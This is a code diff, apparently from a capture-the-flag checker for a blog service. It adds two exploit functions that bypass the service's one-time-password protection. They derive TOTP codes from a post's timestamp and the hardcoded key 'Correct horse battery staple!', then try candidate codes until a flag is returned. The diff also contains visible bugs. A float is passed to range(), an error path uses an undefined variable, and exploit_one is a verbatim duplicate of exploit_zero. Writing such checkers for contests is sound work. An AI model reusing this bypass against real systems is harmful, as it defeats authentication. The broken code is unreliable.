@@ -301,20 +301,26 @@ async def getflag_one(
     return
 
 #find timestamp and postid for post given by title
-def find_params(r, username, postid, title):
+def finddata_for_exploit(r, username, title):
     try:
         html = BeautifulSoup(r.text, "html.parser")
         el_article = html.find_all('article', attrs={"class":"post"})
+        if len(el_article) < 1:
+            raise MumbleException("No article to apply explouit to...")
+
         for article in el_article:
             el_h1 = article.find('h1')
+
             if el_h1.string == title:
                 el_div = article.find("div", attrs={"class":"about"})
                 spliddy = el_div.string.split(' ')
-                name = spliddy[1]
                 time = spliddy[-2:]
+
+                #el_a = article.find('a', attrs={"class":"action"})
+                #post_id = el_a['href'].split('/')[-1]
                 el_a = article.find('a', attrs={"class":"action"})
-                post_id = el_a['href'].split('/')[-1]
-                return time, post_id, name
+                posturl = el_a['href']
+                return time, posturl
     except:
         msg = f"post with id {postid} could not be found"
         raise MumbleException(msg)
@@ -358,41 +364,93 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
         raise InternalErrorException("Missing attack info for exploit")
     attackinfo = json.loads(task.attack_info)
     title = attackinfo['title']
-    postid = attackinfo['postid']
-    username, password, secret = await register_user(task, client, logger)
-    cookie = await login_user(task, client,logger, username, password)
 
-    #access the index, identify post through unique title and gather necessary infos
+    username, password  = await register_user(task, client, logger)
+    cookie = await login_user(task, client, logger, username, password)
     r = await client.get("/", cookies=cookie)
+
     # use the title to find relevant info
-    time, post_id, author = find_params(r, username, postid, title)
-    postkey = str(title) + str(author)
+    time, posturl = finddata_for_exploit(r, username, title)
+    default_key = "Correct horse battery staple!"
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
     timestamp = int(convert_str_to_unixtimestamp(time))
     totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(postkey)
+    totp_device.generate_shared_secret(default_key)
     totp_device.calculate_current_timestep_count()
 
-    #60 divided by range -> length of validity period
-#    for i in range(5):
-
-    dt = datetime.datetime.now(timezone.utc)
-    end = int(dt.timestamp())+3
-    while int(dt.timestamp) <= end:
-
+    rangep = 60/totp_device.timestep
+    for i in range(rangep):
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
-        logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
-        r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
+        #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
+
+        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
         logger.debug(f"response: {r.text}")
         html = BeautifulSoup(r.text, "html.parser")
-        body = html.find('p', attrs={"class":"body"})
-        if body is not None:
-            logger.debug(f"paragraph: {body.string}")
-            if flag := searcher.search_flag(r.text):
-                #await logout_user(client, logger, username)
-                return flag
+        try:
+            body = html.find('p', attrs={"class":"body"})
+            if body is not None:
+                logger.debug(f"paragraph: {body.string}")
+                if flag := searcher.search_flag(r.text):
+                    #await logout_user(client, logger, username)
+                    return flag
+        except:
+            raise MumbleException("Flag not found in exploit")
+
     #await logout_user(client, logger, username)
     raise MumbleException("Flag not found in exploit")
 
+@checker.exploit(1)
+async def exploit_one(task: ExploitCheckerTaskMessage,
+                       searcher: FlagSearcher,
+                       client: AsyncClient,
+                       logger: LoggerAdapter
+                       ) -> Optional[str]:
+    """
+    TODO:
+        - register a new user
+        - login as the new user with valid credentials and totp
+        - access the private event by
+            - reading the creation time and creating a timestamp from it
+            - generating the secret key
+            - calculating the totp.
+    """
+    if task.attack_info == "":
+        raise InternalErrorException("Missing attack info for exploit")
+    attackinfo = json.loads(task.attack_info)
+    title = attackinfo['title']
+
+    username, password  = await register_user(task, client, logger)
+    cookie = await login_user(task, client, logger, username, password)
+    r = await client.get("/", cookies=cookie)
+
+    # use the title to find relevant info
+    time, posturl = finddata_for_exploit(r, username, title)
+    default_key = "Correct horse battery staple!"
+    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
+    timestamp = int(convert_str_to_unixtimestamp(time))
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(default_key)
+    totp_device.calculate_current_timestep_count()
+
+    rangep = 60/totp_device.timestep
+    for i in range(rangep):
+        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
+        #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
+
+        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+        logger.debug(f"response: {r.text}")
+        html = BeautifulSoup(r.text, "html.parser")
+        try:
+            body = html.find('p', attrs={"class":"body"})
+            if body is not None:
+                logger.debug(f"paragraph: {body.string}")
+                if flag := searcher.search_flag(r.text):
+                    #await logout_user(client, logger, username)
+                    return flag
+        except:
+            raise MumbleException("Flag not found in exploit")
+
+    #await logout_user(client, logger, username)
+    raise MumbleException("Flag not found in exploit")
     #assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
     #assert_in(task.flag, r.text, "flag was not found in blogpost")
